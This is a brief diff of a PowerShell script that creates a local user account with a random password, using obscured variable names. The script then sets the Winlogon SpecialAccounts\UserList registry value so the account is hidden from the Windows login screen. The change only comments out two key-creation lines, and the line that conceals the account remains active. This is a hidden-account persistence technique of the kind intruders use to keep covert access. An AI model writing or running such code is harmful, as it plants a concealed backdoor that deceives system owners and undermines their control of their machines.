@@ -27,8 +27,8 @@ Remove-LocalUser -Name "$xf061name"
 $xf061pass = (ConvertTo-SecureString $xf061RandPass -AsPlainText -Force)
 create_account -xf061name $xf061name -xf061pass $xf061pass
 #registry
-New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name SpecialAccounts -Force
-New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts" -Name UserList -Force
+# New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name SpecialAccounts -Force
+# New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts" -Name UserList -Force
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name $xf061name -Value 0 -Type DWORD -Force
 
 # Variables
